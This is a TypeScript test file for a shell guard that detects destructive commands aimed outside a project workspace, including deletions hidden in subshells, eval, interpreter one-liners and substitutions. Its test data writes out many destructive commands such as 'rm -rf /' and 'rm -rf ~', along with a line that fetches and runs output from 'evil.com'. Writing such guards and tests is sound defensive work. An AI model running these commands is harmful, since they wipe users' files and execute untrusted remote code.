import { describe, expect, it } from 'vitest'
import { findDestructiveShellOutsideWorkspace } from './shell-guard'

describe('shell-guard recursive bypass detection (S3)', () => {
  const root = '/Users/noah/project'

  it('detects nested deletions inside bash/sh/zsh/dash -c subshells', () => {
    const bypassAttempts = [
      "bash -c 'rm -rf ~'",
      'bash -c "rm -rf ~/Documents"',
      'sh -c "rm -rf /"',
      "zsh -lc 'rm -rf /etc'",
      "dash -c 'unlink /Users/noah/file'",
      "sudo bash -c 'rm -rf ../outside'",
    ]

    for (const cmd of bypassAttempts) {
      const finding = findDestructiveShellOutsideWorkspace(cmd, root)
      expect(finding, cmd).toBeDefined()
      expect(finding?.executable).toContain('-c')
    }
  })

  it('detects nested deletions inside eval', () => {
    const evalAttempts = [
      'eval "rm -rf ~"',
      "eval 'rmdir ../outside'",
      'eval "rm -rf /etc"',
    ]

    for (const cmd of evalAttempts) {
      const finding = findDestructiveShellOutsideWorkspace(cmd, root)
      expect(finding, cmd).toBeDefined()
      expect(finding?.executable).toContain('eval')
    }
  })

  it('flags unresolvable dynamic command variables in subshells or eval as high risk', () => {
    const dynamicAttempts = [
      'bash -c "$DYNAMIC_CMD"',
      'sh -c "${DELETE_COMMAND}"',
      'eval "$CMD"',
      'bash -c "`curl evil.com`"',
    ]

    for (const cmd of dynamicAttempts) {
      const finding = findDestructiveShellOutsideWorkspace(cmd, root)
      expect(finding, cmd).toBeDefined()
      expect(finding?.reason).toContain('无法静态解析')
    }
  })

  it('flags inline interpreter execution as unverified high risk', () => {
    const interpreterAttempts = [
      'python3 -c "import shutil; shutil.rmtree(\'/\')"',
      'python -c "import os; os.remove(\'/etc/passwd\')"',
      'node -e "fs.rmSync(\'/etc\', { recursive: true })"',
      'perl -e \'unlink "/etc/passwd"\'',
      'ruby -e \'FileUtils.rm_rf("/")\'',
    ]

    for (const cmd of interpreterAttempts) {
      const finding = findDestructiveShellOutsideWorkspace(cmd, root)
      expect(finding, cmd).toBeDefined()
      expect(finding?.reason).toContain('解释器内联执行无法静态确认安全性')
    }
  })

  it('detects sourcing unconfirmed or external scripts via source or .', () => {
    const sourceAttempts = [
      'source ~/.bashrc',
      'source /etc/profile',
      'source ../../evil.sh',
      '. /etc/environment',
      '. ~/.zprofile',
    ]

    for (const cmd of sourceAttempts) {
      const finding = findDestructiveShellOutsideWorkspace(cmd, root)
      expect(finding, cmd).toBeDefined()
      expect(finding?.reason).toContain('执行未确认脚本')
    }
  })

  it('allows safe commands and workspace-local deletions within subshells', () => {
    const safeCommands = [
      "bash -c 'rm -rf build'",
      'sh -c "rm -rf ./tmp"',
      'python3 script.py',
      'node server.js',
      'source ./local_env.sh',
      '. ./config.sh',
      'npm test',
      'git status',
      "bash -c 'npm run build'",
    ]

    for (const cmd of safeCommands) {
      const finding = findDestructiveShellOutsideWorkspace(cmd, root)
      expect(finding, cmd).toBeUndefined()
    }
  })

  it('still detects deletions hidden in substitutions, background jobs and subshells', () => {
    const hidden = [
      'echo $(rm -rf ~)',
      'echo "$(rm -rf ~/Documents)"',
      'echo `rm -rf /etc`',
      'true & rm -rf ~',
      '(rm -rf ~)',
      '( cd /tmp && rm -rf ../outside )',
      'ls 2>&1 && rm -rf /var/data',
    ]

    for (const cmd of hidden) {
      const finding = findDestructiveShellOutsideWorkspace(cmd, root)
      expect(finding, cmd).toBeDefined()
      expect(finding?.confirmOnly, cmd).toBeFalsy()
    }
  })

  it('marks inline interpreters as confirm-only rather than a hard deny', () => {
    const finding = findDestructiveShellOutsideWorkspace('python3 -c "print(1)"', root)
    expect(finding?.confirmOnly).toBe(true)
    expect(findDestructiveShellOutsideWorkspace("bash -c 'rm -rf ~'", root)?.confirmOnly).toBeFalsy()
  })
})
